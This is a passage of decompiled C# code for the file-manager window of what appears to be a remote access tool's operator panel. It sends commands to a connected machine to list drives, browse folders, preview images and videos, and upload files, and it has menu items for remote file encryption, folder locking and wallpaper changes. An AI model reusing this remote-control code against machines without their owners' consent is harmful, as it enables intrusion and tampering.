				}
			}
		}

		// Token: 0x17000095 RID: 149
		// (get) Token: 0x06000155 RID: 341 RVA: 0x0000C417 File Offset: 0x0000A617
		// (set) Token: 0x06000156 RID: 342 RVA: 0x0000C424 File Offset: 0x0000A624
		internal virtual ToolStripMenuItem UnzipToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._UnzipToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UnzipToolStripMenuItem1_Click);
				ToolStripMenuItem unzipToolStripMenuItem = this._UnzipToolStripMenuItem1;
				if (unzipToolStripMenuItem != null)
				{
					unzipToolStripMenuItem.Click -= value2;
				}
				this._UnzipToolStripMenuItem1 = value;
				unzipToolStripMenuItem = this._UnzipToolStripMenuItem1;
				if (unzipToolStripMenuItem != null)
				{
					unzipToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000096 RID: 150
		// (get) Token: 0x06000157 RID: 343 RVA: 0x0000C467 File Offset: 0x0000A667
		// (set) Token: 0x06000158 RID: 344 RVA: 0x0000C471 File Offset: 0x0000A671
		internal virtual ToolStripMenuItem FtpToolStripMenuItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000097 RID: 151
		// (get) Token: 0x06000159 RID: 345 RVA: 0x0000C47A File Offset: 0x0000A67A
		// (set) Token: 0x0600015A RID: 346 RVA: 0x0000C484 File Offset: 0x0000A684
		internal virtual ToolStripMenuItem UploadToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._UploadToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UploadToolStripMenuItem_Click_1);
				ToolStripMenuItem uploadToolStripMenuItem = this._UploadToolStripMenuItem;
				if (uploadToolStripMenuItem != null)
				{
					uploadToolStripMenuItem.Click -= value2;
				}
				this._UploadToolStripMenuItem = value;
				uploadToolStripMenuItem = this._UploadToolStripMenuItem;
				if (uploadToolStripMenuItem != null)
				{
					uploadToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000098 RID: 152
		// (get) Token: 0x0600015B RID: 347 RVA: 0x0000C4C7 File Offset: 0x0000A6C7
		// (set) Token: 0x0600015C RID: 348 RVA: 0x0000C4D4 File Offset: 0x0000A6D4
		internal virtual ToolStripMenuItem SettingsToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._SettingsToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SettingsToolStripMenuItem1_Click);
				ToolStripMenuItem settingsToolStripMenuItem = this._SettingsToolStripMenuItem1;
				if (settingsToolStripMenuItem != null)
				{
					settingsToolStripMenuItem.Click -= value2;
				}
				this._SettingsToolStripMenuItem1 = value;
				settingsToolStripMenuItem = this._SettingsToolStripMenuItem1;
				if (settingsToolStripMenuItem != null)
				{
					settingsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000099 RID: 153
		// (get) Token: 0x0600015D RID: 349 RVA: 0x0000C517 File Offset: 0x0000A717
		// (set) Token: 0x0600015E RID: 350 RVA: 0x0000C524 File Offset: 0x0000A724
		internal virtual ToolStripMenuItem SendFromLinkToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._SendFromLinkToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SendFromLinkToolStripMenuItem1_Click);
				ToolStripMenuItem sendFromLinkToolStripMenuItem = this._SendFromLinkToolStripMenuItem1;
				if (sendFromLinkToolStripMenuItem != null)
				{
					sendFromLinkToolStripMenuItem.Click -= value2;
				}
				this._SendFromLinkToolStripMenuItem1 = value;
				sendFromLinkToolStripMenuItem = this._SendFromLinkToolStripMenuItem1;
				if (sendFromLinkToolStripMenuItem != null)
				{
					sendFromLinkToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700009A RID: 154
		// (get) Token: 0x0600015F RID: 351 RVA: 0x0000C567 File Offset: 0x0000A767
		// (set) Token: 0x06000160 RID: 352 RVA: 0x0000C574 File Offset: 0x0000A774
		internal virtual ToolStripMenuItem SetBackgroundToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._SetBackgroundToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SetBackgroundToolStripMenuItem1_Click);
				ToolStripMenuItem setBackgroundToolStripMenuItem = this._SetBackgroundToolStripMenuItem1;
				if (setBackgroundToolStripMenuItem != null)
				{
					setBackgroundToolStripMenuItem.Click -= value2;
				}
				this._SetBackgroundToolStripMenuItem1 = value;
				setBackgroundToolStripMenuItem = this._SetBackgroundToolStripMenuItem1;
				if (setBackgroundToolStripMenuItem != null)
				{
					setBackgroundToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700009B RID: 155
		// (get) Token: 0x06000161 RID: 353 RVA: 0x0000C5B7 File Offset: 0x0000A7B7
		// (set) Token: 0x06000162 RID: 354 RVA: 0x0000C5C1 File Offset: 0x0000A7C1
		internal virtual ToolStripMenuItem PlayMusicToolStripMenuItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700009C RID: 156
		// (get) Token: 0x06000163 RID: 355 RVA: 0x0000C5CA File Offset: 0x0000A7CA
		// (set) Token: 0x06000164 RID: 356 RVA: 0x0000C5D4 File Offset: 0x0000A7D4
		internal virtual ToolStripMenuItem PlayToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._PlayToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PlayToolStripMenuItem1_Click);
				ToolStripMenuItem playToolStripMenuItem = this._PlayToolStripMenuItem1;
				if (playToolStripMenuItem != null)
				{
					playToolStripMenuItem.Click -= value2;
				}
				this._PlayToolStripMenuItem1 = value;
				playToolStripMenuItem = this._PlayToolStripMenuItem1;
				if (playToolStripMenuItem != null)
				{
					playToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700009D RID: 157
		// (get) Token: 0x06000165 RID: 357 RVA: 0x0000C617 File Offset: 0x0000A817
		// (set) Token: 0x06000166 RID: 358 RVA: 0x0000C624 File Offset: 0x0000A824
		internal virtual ToolStripMenuItem StopToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._StopToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.StopToolStripMenuItem1_Click);
				ToolStripMenuItem stopToolStripMenuItem = this._StopToolStripMenuItem1;
				if (stopToolStripMenuItem != null)
				{
					stopToolStripMenuItem.Click -= value2;
				}
				this._StopToolStripMenuItem1 = value;
				stopToolStripMenuItem = this._StopToolStripMenuItem1;
				if (stopToolStripMenuItem != null)
				{
					stopToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700009E RID: 158
		// (get) Token: 0x06000167 RID: 359 RVA: 0x0000C667 File Offset: 0x0000A867
		// (set) Token: 0x06000168 RID: 360 RVA: 0x0000C671 File Offset: 0x0000A871
		internal virtual ToolStripMenuItem ToolStripMenuItem2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700009F RID: 159
		// (get) Token: 0x06000169 RID: 361 RVA: 0x0000C67A File Offset: 0x0000A87A
		// (set) Token: 0x0600016A RID: 362 RVA: 0x0000C684 File Offset: 0x0000A884
		internal virtual ToolStripMenuItem EncryptToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._EncryptToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EncryptToolStripMenuItem_Click);
				ToolStripMenuItem encryptToolStripMenuItem = this._EncryptToolStripMenuItem;
				if (encryptToolStripMenuItem != null)
				{
					encryptToolStripMenuItem.Click -= value2;
				}
				this._EncryptToolStripMenuItem = value;
				encryptToolStripMenuItem = this._EncryptToolStripMenuItem;
				if (encryptToolStripMenuItem != null)
				{
					encryptToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000A0 RID: 160
		// (get) Token: 0x0600016B RID: 363 RVA: 0x0000C6C7 File Offset: 0x0000A8C7
		// (set) Token: 0x0600016C RID: 364 RVA: 0x0000C6D4 File Offset: 0x0000A8D4
		internal virtual ToolStripMenuItem DecryptToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._DecryptToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DecryptToolStripMenuItem_Click);
				ToolStripMenuItem decryptToolStripMenuItem = this._DecryptToolStripMenuItem;
				if (decryptToolStripMenuItem != null)
				{
					decryptToolStripMenuItem.Click -= value2;
				}
				this._DecryptToolStripMenuItem = value;
				decryptToolStripMenuItem = this._DecryptToolStripMenuItem;
				if (decryptToolStripMenuItem != null)
				{
					decryptToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000A1 RID: 161
		// (get) Token: 0x0600016D RID: 365 RVA: 0x0000C717 File Offset: 0x0000A917
		// (set) Token: 0x0600016E RID: 366 RVA: 0x0000C721 File Offset: 0x0000A921
		internal virtual ToolStripMenuItem FolderLockToolStripMenuItem { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A2 RID: 162
		// (get) Token: 0x0600016F RID: 367 RVA: 0x0000C72A File Offset: 0x0000A92A
		// (set) Token: 0x06000170 RID: 368 RVA: 0x0000C734 File Offset: 0x0000A934
		internal virtual ToolStripMenuItem LockToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._LockToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.LockToolStripMenuItem_Click);
				ToolStripMenuItem lockToolStripMenuItem = this._LockToolStripMenuItem;
				if (lockToolStripMenuItem != null)
				{
					lockToolStripMenuItem.Click -= value2;
				}
				this._LockToolStripMenuItem = value;
				lockToolStripMenuItem = this._LockToolStripMenuItem;
				if (lockToolStripMenuItem != null)
				{
					lockToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000A3 RID: 163
		// (get) Token: 0x06000171 RID: 369 RVA: 0x0000C777 File Offset: 0x0000A977
		// (set) Token: 0x06000172 RID: 370 RVA: 0x0000C784 File Offset: 0x0000A984
		internal virtual ToolStripMenuItem UnlockToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._UnlockToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UnlockToolStripMenuItem_Click);
				ToolStripMenuItem unlockToolStripMenuItem = this._UnlockToolStripMenuItem;
				if (unlockToolStripMenuItem != null)
				{
					unlockToolStripMenuItem.Click -= value2;
				}
				this._UnlockToolStripMenuItem = value;
				unlockToolStripMenuItem = this._UnlockToolStripMenuItem;
				if (unlockToolStripMenuItem != null)
				{
					unlockToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000A4 RID: 164
		// (get) Token: 0x06000173 RID: 371 RVA: 0x0000C7C7 File Offset: 0x0000A9C7
		// (set) Token: 0x06000174 RID: 372 RVA: 0x0000C7D1 File Offset: 0x0000A9D1
		internal virtual ColumnHeader Datemod { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A5 RID: 165
		// (get) Token: 0x06000175 RID: 373 RVA: 0x0000C7DA File Offset: 0x0000A9DA
		// (set) Token: 0x06000176 RID: 374 RVA: 0x0000C7E4 File Offset: 0x0000A9E4
		internal virtual ColumnHeader Type { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A6 RID: 166
		// (get) Token: 0x06000177 RID: 375 RVA: 0x0000C7ED File Offset: 0x0000A9ED
		// (set) Token: 0x06000178 RID: 376 RVA: 0x0000C7F7 File Offset: 0x0000A9F7
		internal virtual ColumnHeader Fsize { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A7 RID: 167
		// (get) Token: 0x06000179 RID: 377 RVA: 0x0000C800 File Offset: 0x0000AA00
		// (set) Token: 0x0600017A RID: 378 RVA: 0x0000C80C File Offset: 0x0000AA0C
		internal virtual ToolStripMenuItem DownloadFolderToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._DownloadFolderToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DownloadFolderToolStripMenuItem_Click);
				ToolStripMenuItem downloadFolderToolStripMenuItem = this._DownloadFolderToolStripMenuItem;
				if (downloadFolderToolStripMenuItem != null)
				{
					downloadFolderToolStripMenuItem.Click -= value2;
				}
				this._DownloadFolderToolStripMenuItem = value;
				downloadFolderToolStripMenuItem = this._DownloadFolderToolStripMenuItem;
				if (downloadFolderToolStripMenuItem != null)
				{
					downloadFolderToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000A8 RID: 168
		// (get) Token: 0x0600017B RID: 379 RVA: 0x0000C84F File Offset: 0x0000AA4F
		// (set) Token: 0x0600017C RID: 380 RVA: 0x0000C859 File Offset: 0x0000AA59
		internal virtual Guna2Panel Guna2Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000A9 RID: 169
		// (get) Token: 0x0600017D RID: 381 RVA: 0x0000C862 File Offset: 0x0000AA62
		// (set) Token: 0x0600017E RID: 382 RVA: 0x0000C86C File Offset: 0x0000AA6C
		internal virtual Guna2GradientButton Guna2GradientButton4
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton4;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton4_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton4;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton4 = value;
				guna2GradientButton = this._Guna2GradientButton4;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170000AA RID: 170
		// (get) Token: 0x0600017F RID: 383 RVA: 0x0000C8AF File Offset: 0x0000AAAF
		// (set) Token: 0x06000180 RID: 384 RVA: 0x0000C8B9 File Offset: 0x0000AAB9
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170000AB RID: 171
		// (get) Token: 0x06000181 RID: 385 RVA: 0x0000C8C2 File Offset: 0x0000AAC2
		// (set) Token: 0x06000182 RID: 386 RVA: 0x0000C8CC File Offset: 0x0000AACC
		internal virtual Guna2TextBox Guna2TextBox2
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2TextBox2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Guna2TextBox2_TextChanged);
				KeyPressEventHandler value2 = new KeyPressEventHandler(this.Guna2TextBox2_KeyPress);
				Guna2TextBox guna2TextBox = this._Guna2TextBox2;
				if (guna2TextBox != null)
				{
					guna2TextBox.TextChanged -= eventHandler;
					guna2TextBox.KeyPress -= value2;
				}
				this._Guna2TextBox2 = value;
				guna2TextBox = this._Guna2TextBox2;
				if (guna2TextBox != null)
				{
					guna2TextBox.TextChanged += eventHandler;
					guna2TextBox.KeyPress += value2;
				}
			}
		}

		// Token: 0x170000AC RID: 172
		// (get) Token: 0x06000183 RID: 387 RVA: 0x0000C92A File Offset: 0x0000AB2A
		// (set) Token: 0x06000184 RID: 388 RVA: 0x0000C934 File Offset: 0x0000AB34
		internal virtual ToolStripMenuItem FileHashToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._FileHashToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FileHashToolStripMenuItem_Click);
				ToolStripMenuItem fileHashToolStripMenuItem = this._FileHashToolStripMenuItem;
				if (fileHashToolStripMenuItem != null)
				{
					fileHashToolStripMenuItem.Click -= value2;
				}
				this._FileHashToolStripMenuItem = value;
				fileHashToolStripMenuItem = this._FileHashToolStripMenuItem;
				if (fileHashToolStripMenuItem != null)
				{
					fileHashToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06000185 RID: 389 RVA: 0x0000C978 File Offset: 0x0000AB78
		private void FM_Load(object sender, EventArgs e)
		{
			byte[] state = Helper.SB("GetDrives");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
			this.ListView1.Controls.Add(this.PictureBox1);
			this.PictureBox1.Visible = false;
		}

		// Token: 0x06000186 RID: 390 RVA: 0x0000C9DC File Offset: 0x0000ABDC
		public void SearchTextInListView(string text, ListView lstSource, int SubItemsN = 0)
		{
			FM._Closure$__257-0 CS$<>8__locals1 = new FM._Closure$__257-0(CS$<>8__locals1);
			CS$<>8__locals1.$VB$Local_lstSource = lstSource;
			ListView listView = new ListView();
			string left = "";
			CS$<>8__locals1.$VB$Local_item1 = null;
			bool flag = Operators.CompareString(left, "", false) == 0 == (Operators.CompareString(text, "", false) == 0);
			bool flag2 = !flag;
			checked
			{
				if (flag2)
				{
					FM._Closure$__257-1 CS$<>8__locals2 = new FM._Closure$__257-1(CS$<>8__locals2);
					CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2 = CS$<>8__locals1;
					CS$<>8__locals2.$VB$Local_Index = 0;
					while (CS$<>8__locals2.$VB$Local_Index < CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_lstSource.Items.Count)
					{
						CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_lstSource.Invoke((CS$<>8__locals2.$I0 == null) ? (CS$<>8__locals2.$I0 = delegate()
						{
							CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_item1 = CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_lstSource.Items[CS$<>8__locals2.$VB$Local_Index];
						}) : CS$<>8__locals2.$I0);
						bool flag3 = !CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_item1.SubItems[SubItemsN].Text.ToLower().Contains(text.ToLower());
						bool flag4 = flag3;
						if (flag4)
						{
							CS$<>8__locals2.$VB$Local_Index--;
							CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_lstSource.Invoke((CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$I1 == null) ? (CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$I1 = delegate()
							{
								CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_lstSource.Items.Remove(CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_item1);
								CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_lstSource.EndUpdate();
							}) : CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$I1);
							bool flag5 = !listView.Items.Contains(CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_item1);
							bool flag6 = flag5;
							if (flag6)
							{
								listView.Items.Add(CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_item1);
							}
						}
						CS$<>8__locals2.$VB$Local_Index++;
					}
					int num = listView.Items.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						CS$<>8__locals2.$VB$Local_cItem = listView.Items[i];
						bool flag7 = CS$<>8__locals2.$VB$Local_cItem.SubItems[SubItemsN].Text.ToLower().Contains(text.ToLower());
						bool flag8 = flag7;
						if (flag8)
						{
							i--;
							listView.Items.Remove(CS$<>8__locals2.$VB$Local_cItem);
							CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_lstSource.Invoke((CS$<>8__locals2.$I2 == null) ? (CS$<>8__locals2.$I2 = delegate()
							{
								CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_lstSource.BeginUpdate();
								CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_lstSource.Items.Add(CS$<>8__locals2.$VB$Local_cItem);
								CS$<>8__locals2.$VB$NonLocal_$VB$Closure_2.$VB$Local_lstSource.EndUpdate();
							}) : CS$<>8__locals2.$I2);
						}
					}
				}
			}
		}

		// Token: 0x06000187 RID: 391 RVA: 0x0000CC70 File Offset: 0x0000AE70
		private void FM_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("CloseFM");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000188 RID: 392 RVA: 0x0000CCB0 File Offset: 0x0000AEB0
		private void ListView1_DoubleClick(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.ListView1.FocusedItem.ImageIndex == 0 | this.ListView1.FocusedItem.ImageIndex == 1 | this.ListView1.FocusedItem.ImageIndex == 3 | this.ListView1.FocusedItem.ImageIndex == 4 | this.ListView1.FocusedItem.ImageIndex == 2;
				if (flag)
				{
					bool flag2 = this.Guna2TextBox1.Text.Length == 0;
					if (flag2)
					{
						Guna2TextBox guna2TextBox;
						(guna2TextBox = this.Guna2TextBox1).Text = guna2TextBox.Text + this.ListView1.FocusedItem.Text;
					}
					else
					{
						Guna2TextBox guna2TextBox;
						(guna2TextBox = this.Guna2TextBox1).Text = guna2TextBox.Text + this.ListView1.FocusedItem.Text + "\\";
					}
					this.RefreshList();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000189 RID: 393 RVA: 0x0000CDD0 File Offset: 0x0000AFD0
		public void RefreshList()
		{
			bool flag = Operators.CompareString(this.Guna2TextBox1.Text, "", false) == 0;
			if (flag)
			{
				byte[] state = Helper.SB("GetDrives");
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
			else
			{
				byte[] state2 = Helper.SB("FileManager" + SettingsHelper.SPL + this.Guna2TextBox1.Text);
				Client $VB$NonLocal_3 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_3.BeginSend((byte[])a0);
				}, state2);
			}
		}

		// Token: 0x0600018A RID: 394 RVA: 0x0000CE78 File Offset: 0x0000B078
		private void ListView1_KeyDown(object sender, KeyEventArgs e)
		{
			try
			{
				bool flag = e.Modifiers == Keys.Control && e.KeyCode == Keys.A;
				if (flag)
				{
					bool flag2 = this.ListView1.Items.Count > 0;
					if (flag2)
					{
						try
						{
							foreach (object obj in this.ListView1.Items)
							{
								ListViewItem listViewItem = (ListViewItem)obj;
								listViewItem.Selected = true;
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			bool flag3 = e.KeyCode == Keys.Return;
			if (flag3)
			{
				e.SuppressKeyPress = true;
				try
				{
					bool flag4 = this.ListView1.FocusedItem.ImageIndex == 0 | this.ListView1.FocusedItem.ImageIndex == 1 | this.ListView1.FocusedItem.ImageIndex == 3 | this.ListView1.FocusedItem.ImageIndex == 4 | this.ListView1.FocusedItem.ImageIndex == 2;
					if (flag4)
					{
						bool flag5 = this.Guna2TextBox1.Text.Length == 0;
						if (flag5)
						{
							Guna2TextBox guna2TextBox;
							(guna2TextBox = this.Guna2TextBox1).Text = guna2TextBox.Text + this.ListView1.FocusedItem.Text;
						}
						else
						{
							Guna2TextBox guna2TextBox;
							(guna2TextBox = this.Guna2TextBox1).Text = guna2TextBox.Text + this.ListView1.FocusedItem.Text + "\\";
						}
						this.RefreshList();
					}
				}
				catch (Exception ex2)
				{
					Debug.WriteLine(ex2.Message);
				}
			}
			bool flag6 = e.KeyCode == Keys.Back;
			if (flag6)
			{
				e.SuppressKeyPress = true;
				try
				{
					bool flag7 = this.Guna2TextBox1.Text.Length < 4;
					if (flag7)
					{
						this.Guna2TextBox1.Text = "";
						byte[] state = Helper.SB("GetDrives" + SettingsHelper.SPL);
						FM._Closure$__R261-8 CS$<>8__locals1 = new FM._Closure$__R261-8(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
					else
					{
						this.Guna2TextBox1.Text = this.Guna2TextBox1.Text.Substring(0, this.Guna2TextBox1.Text.LastIndexOf("\\"));
						this.Guna2TextBox1.Text = this.Guna2TextBox1.Text.Substring(0, checked(this.Guna2TextBox1.Text.LastIndexOf("\\") + 1));
						this.RefreshList();
					}
				}
				catch (Exception ex3)
				{
					Debug.WriteLine(ex3.Message);
				}
			}
		}

		// Token: 0x0600018B RID: 395 RVA: 0x0000D1A8 File Offset: 0x0000B3A8
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600018C RID: 396 RVA: 0x0000D200 File Offset: 0x0000B400
		private void ListView1_SelectedIndexChanged(object sender, EventArgs e)
		{
			this.PictureBox1.Image = null;
			this.PictureBox1.Visible = false;
			bool flag = this.ListView1.SelectedItems.Count == 1;
			if (flag)
			{
				ListViewItem listViewItem = this.ListView1.SelectedItems[0];
				try
				{
					bool flag2 = listViewItem.Text.ToLower().EndsWith(".mp4") | listViewItem.Text.ToLower().EndsWith(".avi") | listViewItem.Text.ToLower().EndsWith(".mkv") | listViewItem.Text.ToLower().EndsWith(".3gp") | listViewItem.Text.ToLower().EndsWith(".wmv") | listViewItem.Text.ToLower().EndsWith(".webm");
					if (flag2)
					{
						byte[] state = Helper.SB("viewvideo" + SettingsHelper.SPL + this.Guna2TextBox1.Text + listViewItem.Text);
						Client $VB$NonLocal_2 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
						this.PictureBox1.Visible = true;
						return;
					}
				}
				catch (Exception ex)
				{
					Debug.WriteLine(ex.Message);
				}
				try
				{
					bool flag3 = listViewItem.Text.ToLower().EndsWith(".jpg") | listViewItem.Text.ToLower().EndsWith(".png") | listViewItem.Text.ToLower().EndsWith(".jpeg") | listViewItem.Text.ToLower().EndsWith(".gif") | listViewItem.Text.ToLower().EndsWith(".bmp") | listViewItem.Text.ToLower().EndsWith(".ico") | listViewItem.Text.ToLower().EndsWith(".tiff");
					if (flag3)
					{
						byte[] state2 = Helper.SB(string.Concat(new string[]
						{
							"viewimage",
							SettingsHelper.SPL,
							this.Guna2TextBox1.Text,
							listViewItem.Text,
							SettingsHelper.SPL,
							this.PictureBox1.Width.ToString(),
							SettingsHelper.SPL,
							this.PictureBox1.Height.ToString()
						}));
						Client $VB$NonLocal_3 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							$VB$NonLocal_3.BeginSend((byte[])a0);
						}, state2);
						this.PictureBox1.Visible = true;
					}
				}
				catch (Exception ex2)
				{
					Debug.WriteLine(ex2.Message);
				}
			}
		}

		// Token: 0x0600018D RID: 397 RVA: 0x0000D508 File Offset: 0x0000B708
		private void FM_Resize(object sender, EventArgs e)
		{
			checked
			{
				this.PictureBox1.Left = this.ListView1.Width - this.PictureBox1.Width - 25;
				this.PictureBox1.Top = this.ListView1.Height - this.PictureBox1.Height - 25;
			}
		}

		// Token: 0x0600018E RID: 398 RVA: 0x0000D562 File Offset: 0x0000B762
		private void ToolStripStatusLabel1_Click(object sender, EventArgs e)
		{
			this.ToolStripStatusLabel1.Visible = false;
			this.ToolStripStatusLabel1.Text = null;
		}

		// Token: 0x0600018F RID: 399 RVA: 0x0000D580 File Offset: 0x0000B780
		private void ListView1_DragEnter(object sender, DragEventArgs e)
		{
			bool dataPresent = e.Data.GetDataPresent(DataFormats.FileDrop);
			if (dataPresent)
			{
				e.Effect = DragDropEffects.Copy;
			}
		}

		// Token: 0x06000190 RID: 400 RVA: 0x0000D5AC File Offset: 0x0000B7AC
		private void ListView1_DragDrop(object sender, DragEventArgs e)
		{
			string[] array = (string[])e.Data.GetData(DataFormats.FileDrop);
			foreach (string path in array)
			{
				bool flag = File.Exists(path);
				if (flag)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"sendfileto",
						SettingsHelper.SPL,
						this.Guna2TextBox1.Text,
						Path.GetFileName(path),
						SettingsHelper.SPL,
						Convert.ToBase64String(Helper.Compress(File.ReadAllBytes(path)))
					}));
					this.ToolStripStatusLabel1.ForeColor = Color.Green;
					this.ToolStripStatusLabel1.Text = Path.GetFileName(path) + " Uploading..";
					this.ToolStripStatusLabel1.Visible = true;
					FM._Closure$__R267-14 CS$<>8__locals1 = new FM._Closure$__R267-14(CS$<>8__locals1);
